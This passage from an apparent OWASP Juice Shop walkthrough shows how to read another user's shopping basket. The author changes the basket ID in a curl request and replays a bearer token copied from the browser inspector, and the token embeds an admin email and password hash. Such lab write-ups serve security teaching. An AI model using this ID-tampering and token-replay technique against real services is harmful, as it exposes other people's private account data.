Again, the hint is really helpful here:

```
Have an eye on the HTTP traffic while shopping. Alternatively try to find client-side association of users to their basket. Click for more hints.
```

If we poke around in the Network tab of the inspector while visiting our basket
we see the following XHR connections made:

```
http://localhost:3000/rest/user/whoami
http://localhost:3000/rest/basket/1
http://localhost:3000/rest/admin/application-configuration
```

The `http://localhost:3000/rest/basket/1` URL looks most interesting for this
challenge. Let's try and grab another user's bucket:

```
$ curl -s 'http://localhost:3000/rest/basket/2'
<html>
...
  </head>
  <body>
    <div id="wrapper">
      <h1>Juice Shop (Express ~4.16)</h1>
      <h2><em>401</em> UnauthorizedError: No Authorization header was found</h2>
      <ul id="stacktrace"></ul>
    </div>
  </body>
</html>
```

If we look carefully at the connections in the Network tab in the inspector
we can see they include an `Authorization` header. We can grab the header from
the inspector and try again:

```
$ curl -s 'http://localhost:3000/rest/basket/2' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAifSwiaWF0IjoxNTE1MDEyMjc4LCJleHAiOjE1MTUwMzAyNzh9.GyvuBD6CTsQqE8sr7TX2a7WB4dOUTPnW58GoxuODaJzEEMAr8mtiIsFjY1Vwo9JRhWP4krbn1djXDfs7NP0D8qi2ybfcuwSBiFp2NROce9TpIcSG9jUj8OPlLsoR7dJBkPfhjN4LF111Qtl0HX1YlSYRdITSMj9ybvbRmQ_YgKo'
{"status":"success","data":{"id":2,"coupon":null,"createdAt":"2018-01-03T20:18:03.861Z","updatedAt":"2018-01-03T20:18:03.861Z","UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"image":"raspberry_juice.jpg","createdAt":"2018-01-03T20:18:03.856Z","updatedAt":"2018-01-03T20:18:03.856Z","deletedAt":null,"BasketItem":{"id":4,"quantity":2,"createdAt":"2018-01-03T20:18:03.861Z","updatedAt":"2018-01-03T20:18:03.861Z","BasketId":2,"ProductId":4}}]}}
```

Let's make that a bit more readable:

```
$ curl -s 'http://localhost:3000/rest/basket/2' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTAzIDIwOjE4OjAzLjg1NCArMDA6MDAifSwiaWF0IjoxNTE1MDEyMjc4LCJleHAiOjE1MTUwMzAyNzh9.GyvuBD6CTsQqE8sr7TX2a7WB4dOUTPnW58GoxuODaJzEEMAr8mtiIsFjY1Vwo9JRhWP4krbn1djXDfs7NP0D8qi2ybfcuwSBiFp2NROce9TpIcSG9jUj8OPlLsoR7dJBkPfhjN4LF111Qtl0HX1YlSYRdITSMj9ybvbRmQ_YgKo' | python -mjson.tool
{
    "data": {
        "Products": [
            {
                "BasketItem": {
                    "BasketId": 2,
                    "ProductId": 4,
                    "createdAt": "2018-01-03T20:18:03.861Z",
                    "id": 4,
                    "quantity": 2,
                    "updatedAt": "2018-01-03T20:18:03.861Z"
                },
                "createdAt": "2018-01-03T20:18:03.856Z",
                "deletedAt": null,
                "description": "Made from blended Raspberry Pi, water and sugar.",
                "id": 4,
                "image": "raspberry_juice.jpg",
                "name": "Raspberry Juice (1000ml)",
                "price": 4.99,
                "updatedAt": "2018-01-03T20:18:03.856Z"
            }
        ],
        "UserId": 2,
        "coupon": null,
        "createdAt": "2018-01-03T20:18:03.861Z",
        "id": 2,
        "updatedAt": "2018-01-03T20:18:03.861Z"
    },
    "status": "success"
}
```

And the challenge is complete!
